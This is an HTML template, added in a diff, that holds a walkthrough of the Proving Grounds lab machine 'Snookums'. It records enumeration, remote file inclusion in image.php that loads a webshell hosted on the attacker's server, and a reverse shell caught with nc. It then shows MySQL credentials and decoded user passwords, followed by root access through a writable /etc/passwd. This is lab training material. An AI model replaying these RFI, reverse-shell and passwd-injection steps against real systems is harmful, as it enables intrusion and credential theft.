@@ -1,0 +1,239 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Practice : Snookums</h1>
+    <p class="text">Difficulty : Intermediate | CommunityRating : Intermediate | MyRating : Easy | ClearTime : 1h40min</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ cat tcp                                                                                 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 20:09 EST
+Nmap scan report for 192.168.231.58
+Host is up (0.091s latency).
+
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         vsftpd 3.0.2
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.45.200
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.2 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
+|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
+|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
+80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Simple PHP Photo Gallery
+111/tcp   open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
+445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
+3306/tcp  open  mysql       MySQL (unauthorized)
+33060/tcp open  mysqlx      MySQL X protocol listener
+Service Info: Host: SNOOKUMS; OS: Unix
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.10.4)
+|   Computer name: snookums
+|   NetBIOS computer name: SNOOKUMS\x00
+|   Domain name: \x00
+|   FQDN: snookums
+|_  System time: 2025-12-09T20:09:18-05:00
+|_clock-skew: mean: 1h39m49s, deviation: 2h53m13s, median: -10s
+| smb2-security-mode: </code></pre></div>
+
+<p class="text">Though FTP allows anonymous login, it doesn't return files and other open ports are not vulnerable. Therefore, the main target would be http.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/snookums/1.png' %}" alt="">
+    <p class="text">It says it uses Simple PHP Photo Gallery v0.8, and when i searched Simple PHP Photo Gallery v0.8 vulnerability, there is a LFI exploit. However, If I tried several patterns with LFI, I couldn't extract any files.</p>
+</div>
+<p class="text">Therefore, I concluded it's rabbit hole and tried to find another vector.</p>
+<p class="text">First I enumerated http directory with gobuster. Since the target uses php library, I attached -x php flag.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://192.168.231.58 -t 70 -x php
+...
+===============================================================
+/.htpasswd            (Status: 403) [Size: 211]
+/.htaccess            (Status: 403) [Size: 211]
+/.htaccess.php        (Status: 403) [Size: 215]
+/.htpasswd.php        (Status: 403) [Size: 215]
+/.hta.php             (Status: 403) [Size: 210]
+/.hta                 (Status: 403) [Size: 206]
+/cgi-bin/             (Status: 403) [Size: 210]
+/css                  (Status: 301) [Size: 234] [--> http://192.168.215.58/css/]
+/db.php               (Status: 200) [Size: 0]
+/functions.php        (Status: 200) [Size: 0]
+<u>/image.php</u>            (Status: 200) [Size: 1508]
+/images               (Status: 301) [Size: 237] [--> http://192.168.215.58/images/]
+/index.php            (Status: 200) [Size: 2730]
+/index.php            (Status: 200) [Size: 2730]
+/js                   (Status: 301) [Size: 233] [--> http://192.168.215.58/js/]
+/photos               (Status: 301) [Size: 237] [--> http://192.168.215.58/photos/]
+Progress: 9492 / 9492 (100.00%)
+===============================================================
+...</code></pre></div>
+
+<p class="text">I found interesting file image.php. I researched the keyword <u>Simple PHP Photo Gallery image.php</u> then found RFI vulnerability <a href="https://www.exploit-db.com/exploits/48424">here</a>.</p>
+<p class="text">Though the version seems to be incompatible, it's worth testing since it's possible that the vulnerability haven't been patched on this version 0.8.</p>
+
+<p class="text">I grabbed <a href="https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/refs/heads/master/webshell.php">this</a> webshell code, and tested RFI. To serve downloaded webshell, I hosted http with python.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/refs/heads/master/webshell.php
+
+┌──(kali㉿kali)-[~/tempo]
+└─$ python3 -m http.server 80</code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/snookums/2.png' %}" alt="">
+    <p class="text">Navigating to http://192.168.215.58/image.php?img=http://192.168.45.210/webshell.php, I could open webshell via RFI.</p>
+</div>
+
+<p class="text">I executed python revshell code generated by <a href="https://www.revshells.com/">revshell.com</a>.</p>
+<p class="text">※Since the port 4444 is blocked, I used port 445.</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ rlwrap nc -lvnp 445
+listening on [any] 445 ...
+connect to [192.168.45.210] from (UNKNOWN) [192.168.215.58] 56672
+sh-4.2$</code></pre></div>
+
+
+<h2 class="subtitle">Lateral Movement</h2>
+<p class="text">Since MySQL is open on the target machine, it might provide us PE vector. While I was searching /var/www folder, I found db.php. It contains mysql user credential.</p>
+<div class="code-box"><pre><code>sh-4.2$ cat db.php
+cat db.php
+&lt;?php
+define('DBHOST', '127.0.0.1');                                                                                                   
+define('DBUSER', 'root');                                                                                                        
+define('DBPASS', 'MalapropDoffUtilize1337');                                                                                     
+define('DBNAME', 'SimplePHPGal');                                                                                                
+?> </code></pre></div>
+<p class="text">We can see mysql database with this credential.</p>
+<div class="code-box"><pre><code>sh-4.2$ mysql -uroot -pMalapropDoffUtilize1337
+mysql -uroot -pMalapropDoffUtilize1337
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with ; or \g.                                                                        
+Your MySQL connection id is 8                                                                                                    
+Server version: 8.0.20 MySQL Community Server - GPL                                                                              
+                                                                                                                                 
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql></code></pre></div>
+
+<p class="text">There is base64 encoded passwords in the database SimplePHPGal.</p>
+<div class="code-box"><pre><code>mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| SimplePHPGal       |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.01 sec)
+
+mysql> use SimplePHPGal
+use SimplePHPGal
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
+show tables;
++------------------------+
+| Tables_in_SimplePHPGal |
++------------------------+
+| users                  |
++------------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from users;
+select * from users;
++----------+----------------------------------------------+
+| username | password                                     |
++----------+----------------------------------------------+
+| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
+| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
+| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
++----------+----------------------------------------------+</code></pre></div>
+
+<p class="text">Since it ends with = sign, it must be base64 encoded string.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ echo U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ== | base64 -d            
+SG9ja1N5ZG5leUNlcnRpZnkxMjM= </code></pre></div>
+<p class="text">Don't worry. It's double encoded.</p>
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ echo U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ== | base64 -d | base64 -d
+HockSydneyCertify123</code></pre></div>
+
+<p class="text">We got michael's password.</p>
+<div class="code-box"><pre><code>sh-4.2$ su michael
+su michael
+Password: HockSydneyCertify123
+
+[michael@snookums html]$</code></pre></div>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">I uploaded linpeas.sh to target machine, and found interesting information.</p>
+<div class="code-box"><pre><code>╔══════════╣ Permissions in init, init.d, systemd, and rc.d
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                     
+                                                                                                                                 
+═╣ Hashes inside passwd file? ........... No
+═╣ Writable passwd file? ................ <u>/etc/passwd is writable</u>                                                                
+═╣ Credentials in fstab/mtab? ........... No
+═╣ Can I read shadow files? ............. No                                                                                     
+═╣ Can I read shadow plists? ............ No                                                                                     
+═╣ Can I write shadow plists? ........... No                                                                                     
+═╣ Can I read opasswd file? ............. No                                                                                     
+═╣ Can I write in network-scripts? ...... No                                                                                     
+═╣ Can I read root folder? .............. No  </code></pre></div>
+
+<p class="text">When it comes to that we can edit /etc/password, we can create new user with whatever uid.</p>
+<div class="code-box"><pre><code>[michael@snookums ~]$ pw=$(openssl passwd Password123); echo "r00t:${pw}:0:0:root:/root:/bin/bash" >> /etc/passwd
+&lt;); echo "r00t:${pw}:0:0:root:/root:/bin/bash" >> /etc/passwd                
+Warning: truncating password to 8 characters
+[michael@snookums ~]$ su r00t
+su r00t
+Password: Password123
+
+[root@snookums michael]#</code></pre></div>
+
+<p class="text">We got root shell.</p>
+
+</body>
+</html>
